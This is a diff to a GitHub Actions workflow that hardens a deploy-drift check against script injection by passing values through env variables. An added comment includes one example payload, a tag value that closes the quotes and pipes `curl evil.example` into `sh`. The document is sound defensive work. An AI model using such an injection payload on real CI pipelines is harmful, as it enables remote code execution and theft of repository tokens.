@@ -146,9 +146,26 @@ jobs:
           echo "Deployed tag: ${tag}"
 
       - name: Compare (blocking)
+        # Values reach the shell as ENV, never as `${{ }}` spliced into the
+        # script body. `${{ }}` is textual substitution performed BEFORE bash
+        # ever sees the line, so quoting it does nothing: the quotes are part of
+        # the text the attacker's value lands next to, and a value can simply
+        # close them. DEPLOYED_TAG is the one that mattered - it is awk'd out of
+        # kustomization.yaml fetched from olafkfreund/factory-gitops, and that
+        # repo is PUBLIC. A newTag of
+        #     x"; curl evil.example | sh; echo "
+        # would have run as this step's shell, in a job holding GITOPS_PAT.
+        # GRACE_MINUTES is a workflow_dispatch/workflow_call input and carries
+        # the same class. As env vars they are data: bash expands "$DEPLOYED_TAG"
+        # after parsing, so metacharacters inside it are never source text.
+        env:
+          EXPECTED_SHA: ${{ steps.expected.outputs.sha }}
+          COMMIT_EPOCH: ${{ steps.expected.outputs.epoch }}
+          DEPLOYED_TAG: ${{ steps.deployed.outputs.tag }}
+          GRACE_MINUTES: ${{ inputs.grace_minutes }}
         run: |
           python3 hub/scripts/check_deploy_drift.py \
-            --expected-sha "${{ steps.expected.outputs.sha }}" \
-            --commit-epoch "${{ steps.expected.outputs.epoch }}" \
-            --deployed-tag "${{ steps.deployed.outputs.tag }}" \
-            --grace-minutes "${{ inputs.grace_minutes }}"
+            --expected-sha "$EXPECTED_SHA" \
+            --commit-epoch "$COMMIT_EPOCH" \
+            --deployed-tag "$DEPLOYED_TAG" \
+            --grace-minutes "$GRACE_MINUTES"
